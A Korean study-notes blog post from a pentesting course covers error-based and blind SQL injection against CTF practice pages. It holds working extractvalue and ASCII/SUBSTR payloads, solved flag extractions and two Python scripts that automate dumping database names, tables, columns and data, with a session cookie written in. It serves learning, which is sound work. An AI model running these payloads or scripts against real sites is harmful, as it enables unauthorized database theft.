---
layout: post
title:  노말틱 모의해킹 스터디 7주차 강의 정리 Error Based SQLi, Blind SQLi
author: leewoojin
date: 2025-05-23 00:00:00 +0900
categories: [Pentest, W6]
tags: []
---

## Error Base SQL Injecton 

1) SQL 질의가 결과가 화면에 출력된다 - union sqli 
2) Eroor 출력될 때 -> Error Based SQL injection 
- 에러 메시지르 활용 해서 데이터를 출력 
> 로직 에러 
> SQL 에러 

- 문법 에러 -> 쓸모가 없다 


Error Based SQL injection (ID 중복 검사 )
`normaltic and extractvalue('1', ':normaltic')' and '1'='1 

extracvalue(1,2)

normaltic' and extractvalue ('1', concat (0x3a, (select 'normatltic'))) and '1'= '1 
concat() - 문자를 합쳐주는 함수는 
0x3a - :

----
* Error Based SQL Injection 
-> 에러 메시지를 활용해서 sql 질의문을 삽입. 
-> 데이터를 추출
(select ~)
(select pass from member where id='normatic')=1

* Select 문의 결과를 어떻게 에러 메시지에 포함 시킬까? 
mysql, oracle , messsql 등 
mysql - extractavlue ('xml 글자' , ' xml 표현식')

extractvalue ('1', ':normaltic' )


Concat ('hello', 'test') -> hellotest
concat (0x3a, 'select') -> :select~
: 를 넣는 이유 extractvalue 특성상 노말 xml 표현식이 아니라서 (에?)

---
SQL 포인트 찾기 

1. SQL Injection Point 
2. 에러 출력 함수 extractvalue 
3. 공격 format 만들기 
normaltic' and extractavalue('1', concat (0x3a,())) and '1'='1
4. DB 이름 출력 
-> select database()
5. 테이블 이름 
select table_name form information_schema.tables where table_schema'db명' limit 0,1 
limit 을 안쓰면 행이 많아서 오류가 남  
두번째 테이블을 보고 싶다면 limit 1,1
6. 컬럼 이름 
select column_name from information_schema.columms.where table_name'테이블명' limit 0,1

---

1. sql 질의문 결과가 화면에 출력되는 경우 : UNION SQL 
2. 에러메시지가 화면에 출력되는 경우 : Error Based SQL 
3. Blind SQLi
> 아이디 중복 검사 , 로그인
`select pass form member where id='normaltic'`
`normaltic' and ('1'='2') and '1'='1` -> 존재하지 않는 아이디 입니다. 
`normaltic' and ('1'='1') and '1'='1` -> 존재하는 아이디 입니다. 

---
1. SQL Injection 여부 
normaltic' and ('1'='1') and '1'='1 참 or 거짓 판단 
2. select 문 사용 가능 여부 
normaltic' and ((select 'test')='test') and '1'='1
3. 공격 format 
normaltic' and (__조건__) and '1'='1

substr('test',1,1)=> 't' 
substr((__SQL__),1,1)

업다운 게임을 하듯이 1~100 까지 찾는다면 50을 부르는게 편하듯이 

문자 -> 숫자 = 아스키 문자를 활용하여 
ascii(substr((__SQL__),1,1)>0) -> 공격 페이로드 

---
7주차 
1. Error Based SQLi 정리 & 연습문제 풀기 [SQL Injection (Error Based SQLi Basic)]
2. Blind SQli 정리 & 문제 
- write up 

3. 웹 사이트 개발 과제 
> 게시판 리스트 보여주는 페이지 
- 게시글 상세 내용 보여주는 페이지 
- 게이글 작성 페이지 


---

## 6주차 복습 [ UNION SQL Injection ]

### UNION SQL Injection이란?
UNION SQL Injection은 게시글 검색, 주소 검색 등 사용자의 입력값을 기반으로 쿼리를 수행하고 결과를 웹 페이지에 출력하는 기능에서 자주 발생하는 SQL Injection 기법입니다.

<img width="1193" alt="Image" src="https://github.com/user-attachments/assets/196cdb13-66c3-4a1b-ba6c-1baf9fd2f34b" />

### UNION SQL Injection 공격 전 필수 확인 사항
공격자가 SQL Injection 취약점이 의심되는 검색 입력창에 대해 UNION SELECT를 시도하기 전에 반드시 확인해야 하는 것이 두 가지 있습니다.
- 기존 쿼리문의 컬럼 수
- 각 컬럼의 데이터 타입

### 🧪 공격 단계 요약
✅ 1단계: 취약점 탐지
' 또는 || 같은 특수문자를 입력해 SQL 문법 오류 유무 확인.
- 오류 메시지로부터 취약성 존재 여부 판단.

✅ 2단계: 컬럼 수 및 데이터형 확인
- ORDER BY 이용: ORDER BY n -- 로 컬럼 수 파악

✅ 3단계: 정보 탈취
- 테이블 목록 확인: SELECT table_name FROM user_tables
- 컬럼 목록 확인: SELECT column_name FROM all_tab_columns WHERE table_name='MEMBER'
- 데이터 추출: SELECT userid, userpw FROM member


## Error Based SQL Injection 
### Error Based SQL Injection이란?
**Error Based SQL Injection(에러 기반 SQL 인젝션)**은 웹 애플리케이션이 SQL 구문 실행 중 발생한 에러 메시지를 사용자에게 그대로 노출할 때, 이 에러 메시지를 악용하여 데이터베이스의 내부 정보를 탈취하는 공격 기법입니다.

<img width="1398" alt="Image" src="https://github.com/user-attachments/assets/ea1b9a09-c1dc-4294-ac65-115eb5616089" />

### 사용되는 함수 및 의미 
| 함수               | 설명                                                       |
| ---------------- | -------------------------------------------------------- |
| `extractvalue()` | XML에서 XPath를 해석하는 함수 (고의적 에러 유도)                         |
| `concat()`       | 문자열 결합. 예: `concat(0x3a, (SELECT database()))` → `:DB이름` |
| `0x3a`           | `:`의 hex 코드, XML 에러 구조에 맞추기 위한 포맷                        |

### 단계별 공격 흐름
✅ (1) Injection Point 찾기
- ' 등 특수문자 입력 시 에러가 발생하는지 확인

✅ (2) 에러 유발 함수 확인
- extractvalue(1,1) 등 테스트로 메시지 확인

✅ (3) 공격 쿼리 포맷 설계
```sql
' AND extractvalue(1, concat(0x3a, (__SQL__)))) AND '1'='1
```

✅ (4) DB 정보 추출 쿼리
| 목표       | 쿼리                                                                                           |
| -------- | -------------------------------------------------------------------------------------------- |
| DB 이름    | `SELECT database()`                                                                          |
| 테이블명     | `SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 0,1` |
| 컬럼명      | `SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1`      |
| 데이터명 | `select 컬럼명 from 테이블 명 limit 0,1` |

### 문제 풀이 

DB 이름 : `normaltic' AND extractvalue(1, concat(0x3a, (SELECT database()))) AND '1'='1`

<img width="1408" alt="Image" src="https://github.com/user-attachments/assets/d6a09370-b13d-438a-b476-86c2a30cf9df" />

테이블명 : `normaltic' AND extractvalue(1, concat(0x3a, (SELECT table_name FROM information_schema.tables WHERE table_schema = 'errSqli' LIMIT 0,1))) AND '1'='1`

<img width="1411" alt="Image" src="https://github.com/user-attachments/assets/94886f20-9f25-45f7-a702-6a8abe046578" />

컬럼명 : `normaltic' AND extractvalue(1, concat(0x3a, (SELECT column_name FROM information_schema.columns WHERE table_name='plusFlag_Table' LIMIT 0,1))) AND '1'='1`

<img width="1408" alt="Image" src="https://github.com/user-attachments/assets/c4634a70-1c73-4037-a741-71c7189448de" />

데이터 출력 : `nomaltic' AND extractvalue(1, concat(0x3a, (SELECT flag FROM plusFlag_Table LIMIT 0,1))) AND '1'='1`
<img width="1404" alt="Image" src="https://github.com/user-attachments/assets/6b49b24b-3785-45a7-aa7d-c95f90763ef9" />

### 자동화 코드 

<details>
<summary> 자동화 코드</summary>

```python
import requests
import re

# === 사용자 설정 영역 ===
TARGET_URL = "http://ctf.segfaulthub.com:1020/sqlInjection4_1.php"
POST_PARAM = "query"

ERROR_REGEX = r"XPATH syntax error: ':(.*?)'"  # 결과 추출용

HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0",
    "Referer": TARGET_URL
}
COOKIE = {
    "session": "e92ecd71-869b-4e26-91df-c4bdbc7bd399.iSMyVmkdsH1yV4GfBSmCRcDJ-_Q"
}

# === 페이로드 생성 함수 ===
def make_payload(injected_sql):
    return f"nomaltic' AND extractvalue(1, concat(0x3a, ({injected_sql}))) AND '1'='1"

# === 데이터 추출 함수 ===
def extract_info(injected_sql, show_payload=False):
    payload = make_payload(injected_sql)
    data = {POST_PARAM: payload}
    response = requests.post(TARGET_URL, headers=HEADERS, cookies=COOKIE, data=data)
    match = re.search(ERROR_REGEX, response.text)
    return match.group(1) if match else None

# === 모든 테이블명 추출 ===
def extract_all_table_names(max_tables=20):
    print("\n━━━━━━━━━━━━━━━\n📂 테이블 목록\n━━━━━━━━━━━━━━━")
    tables = []
    for i in range(max_tables):
        query = f"SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 1 OFFSET {i}"
        table_name = extract_info(query)
        if table_name:
            print(f"  [{i:2}] {table_name}")
            tables.append(table_name)
        else:
            break
    return tables

# === 특정 테이블의 컬럼명 추출 ===
def extract_columns_for_table(table_name, max_columns=20):
    print(f"\n━━━━━━━━━━━━━━━\n📄 '{table_name}'의 컬럼 목록\n━━━━━━━━━━━━━━━")
    columns = []
    for i in range(max_columns):
        query = f"SELECT column_name FROM information_schema.columns WHERE table_name = '{table_name}' LIMIT 1 OFFSET {i}"
        column = extract_info(query)
        if column:
            print(f"  [{i:2}] {column}")
            columns.append(column)
        else:
            break
    return columns

# === 선택된 컬럼에서 값 추출 ===
def extract_value_from_column(table_name, column_name):
    query = f"SELECT {column_name} FROM {table_name} LIMIT 0,1"
    value = extract_info(query)
    print("\n━━━━━━━━━━━━━━━\n📌 데이터 결과\n━━━━━━━━━━━━━━━")
    if value:
        print(f"✓ {table_name}.{column_name} → {value}")
    else:
        print(f"✗ {table_name}.{column_name} → [값 없음 또는 접근 실패]")

# === 전체 실행 흐름 ===
if __name__ == "__main__":
    print("━━━━━━━━━━━━━━━\n🧠 DB 정보 추출\n━━━━━━━━━━━━━━━")
    db_name = extract_info("SELECT database()")
    print(f"📌 현재 DB 이름: {db_name}")

    all_tables = extract_all_table_names()
    if not all_tables:
        print("✗ 테이블을 찾을 수 없습니다.")
        exit()

    selected_index = input("\n[테이블 번호 선택] > ").strip()
    if selected_index.isdigit() and int(selected_index) < len(all_tables):
        selected_table = all_tables[int(selected_index)]
        columns = extract_columns_for_table(selected_table)
        if not columns:
            print("✗ 컬럼이 존재하지 않습니다.")
            exit()

        selected_col_index = input("\n[컬럼 번호 선택] > ").strip()
        if selected_col_index.isdigit() and int(selected_col_index) < len(columns):
            selected_column = columns[int(selected_col_index)]
            extract_value_from_column(selected_table, selected_column)
        else:
            print("✗ 유효하지 않은 컬럼 선택입니다.")
    else:
        print("✗ 유효하지 않은 테이블 선택입니다.")
```
</details> 
<br>
<img width="535" alt="Image" src="https://github.com/user-attachments/assets/ee2a2a17-575e-4966-91a0-839198e3fde9" />

## Blind SQL Injection 

### Blind SQL Injection 
Blind SQL Injection은 응답에 직접적인 SQL 에러나 결과가 표시되지 않는 경우에도,
**"응답의 변화"**를 기반으로 데이터베이스의 정보를 간접적으로 추론하는 공격입니다.

<img width="1409" alt="Image" src="https://github.com/user-attachments/assets/970a81cf-5936-4614-b3cd-9b8cc306fcdf" />

### 핵심 함수 정리
| 함수                  | 설명          | 예시                                           |
| ------------------- | ----------- | -------------------------------------------- |
| `SUBSTR(str, i, 1)` | i번째 문자 추출   | `SUBSTR('test',1,1)` → `'t'`                 |
| `ASCII(char)`       | 문자를 아스키 숫자로 | `ASCII('a') = 97`                            |
| 비교연산                | 크기 비교 가능    | `' AND ASCII(SUBSTR((SELECT db),1,1)) > 100` |


### 공격 포맷
```sql
normaltic' AND ASCII(SUBSTR((__SQL__), 1, 1)) > 100 AND '1'='1
```
문자 하나를 알아낼 때 "업다운 게임" 하듯이 ASCII 값을 이진 탐색하면 효율적입니다
- 예: 데이터베이스 이름의 첫 글자가 'e'인지 알아내기 위한 흐름

```sql 
AND ASCII(SUBSTR((SELECT database()), 1, 1)) > 100 -- 참? → 더 위
AND ASCII(SUBSTR((SELECT database()), 1, 1)) < 110 -- 참? → 더 아래
→ 최종적으로 'e'(101) 도출
```

### Blind SQL Injection 페이로드 치트시트
| 단계  | 목적        | 전체 페이로드                                                                                                                                                                                  |
| --- | --------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1단계 | DB 이름 추출  | `normaltic' AND (ASCII(SUBSTR((SELECT database()), 1, 1)) > 100) AND '1'='1`                                                                                                             |
| 2단계 | 테이블 이름 추출 | `normaltic' AND (ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema='blindSqli' LIMIT 1 OFFSET 0), 1, 1)) > 100) AND '1'='1`                              |
| 3단계 | 컬럼 이름 추출  | `normaltic' AND (ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_schema='blindSqli' AND table_name='flagTable' LIMIT 1 OFFSET 0), 1, 1)) > 100) AND '1'='1` |
| 4단계 | 데이터 추출    | `normaltic' AND (ASCII(SUBSTR((SELECT flag FROM flagTable LIMIT 1 OFFSET 0), 1, 1)) > 100) AND '1'='1`                                                                                   |

### 자동화 코드 

<details>
<summary>자동화 코드 </summary>

```python
    import requests

    # [1] 설정
    url = "http://ctf.segfaulthub.com:1020/sqlInjection5_1.php"
    cookies = {
        "session": "e92ecd71-869b-4e26-91df-c4bdbc7bd399.iSMyVmkdsH1yV4GfBSmCRcDJ-_Q"
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0"
    }

    # [2] 참/거짓 판단 함수
    def is_condition_true(payload):
        data = {"query": payload}
        response = requests.post(url, headers=headers, cookies=cookies, data=data)
        return "존재하는 아이디입니다." in response.text

    # [3] 문자열 추출 함수
    def extract_string(query_template, max_len=50):
        result = ""
        for i in range(1, max_len + 1):
            low, high = 32, 126
            found = False
            while low <= high:
                mid = (low + high) // 2
                payload = f"normaltic' AND (ASCII(SUBSTR(({query_template}),{i},1))>{mid}) AND '1'='1"
                if is_condition_true(payload):
                    low = mid + 1
                else:
                    payload = f"normaltic' AND (ASCII(SUBSTR(({query_template}),{i},1))<{mid}) AND '1'='1"
                    if is_condition_true(payload):
                        high = mid - 1
                    else:
                        result += chr(mid)
                        print(f"  [+] {i}번째 문자: {chr(mid)} → 현재까지: {result}")
                        found = True
                        break
            if not found:
                break

        if result and result[0] == 'O' and len(set(result)) == 1:
            print("  [!] 해당 데이터는 의미 없는 반복 문자입니다. 존재하지 않는 항목일 수 있습니다.")
            return None
        return result

    # [4] 목록 추출 함수 (테이블/컬럼/데이터)
    def extract_list_items(query_gen_fn, label):
        results = []
        offset = 0
        while True:
            print(f"\n[*] {label} OFFSET {offset} 추출 중...")
            query = query_gen_fn(offset)
            item = extract_string(query)
            if item:
                results.append(item)
                cont = input(f"[?] '{item}' 다음 {label.lower()}도 추출할까요? (y/n): ")
                if cont.lower() != 'y':
                    break
                offset += 1
            else:
                print(f"[-] 더 이상 {label.lower()} 없음.")
                break
        return results

    # [5] 전체 흐름
    def main():
        print("[Step 1] DB 이름 추출")
        db_name = extract_string("SELECT database()")
        print(f"\n[✓] DB 이름: {db_name}")

        while True:
            # Step 2: 테이블 목록 추출
            print("\n[Step 2] 테이블 목록 추출")
            tables = extract_list_items(
                lambda offset: f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT 1 OFFSET {offset}",
                "테이블"
            )
            if not tables:
                return

            while True:
                print("\n[Step 3] 사용할 테이블 선택:")
                for idx, t in enumerate(tables, start=1):
                    print(f"  {idx}: {t}")
                print("  b: 상위 메뉴로 돌아가기 (DB 재시도)")
                selected = input("→ 테이블 번호 선택: ").strip().lower()

                if selected == 'b':
                    break  # DB 메뉴로
                if not selected.isdigit() or not (1 <= int(selected) <= len(tables)):
                    print("[!] 유효한 숫자 또는 'b'를 입력하세요.")
                    continue

                table = tables[int(selected) - 1]

                while True:
                    print(f"\n[✓] 선택된 테이블: {table}")
                    print("\n[Step 4] 컬럼 목록 추출")
                    columns = extract_list_items(
                        lambda offset: f"SELECT column_name FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table}' LIMIT 1 OFFSET {offset}",
                        "컬럼"
                    )
                    if not columns:
                        break

                    while True:
                        print("\n[Step 5] 사용할 컬럼 선택:")
                        for idx, c in enumerate(columns, start=1):
                            print(f"  {idx}: {c}")
                        print("  b: 상위 메뉴로 돌아가기 (테이블 재선택)")
                        col_selected = input("→ 컬럼 번호 선택: ").strip().lower()

                        if col_selected == 'b':
                            break  # 테이블 재선택
                        if not col_selected.isdigit() or not (1 <= int(col_selected) <= len(columns)):
                            print("[!] 유효한 숫자 또는 'b'를 입력하세요.")
                            continue

                        column = columns[int(col_selected) - 1]
                        print(f"\n[✓] 선택된 컬럼: {column}")
                        print("\n[Step 6] 데이터 추출")
                        extract_list_items(
                            lambda offset: f"SELECT {column} FROM {table} LIMIT 1 OFFSET {offset}",
                            "데이터"
                        )
                        break  # 컬럼 1개 추출 후 끝
                    break
                break

    if __name__ == "__main__":
        main()
```
</details> 
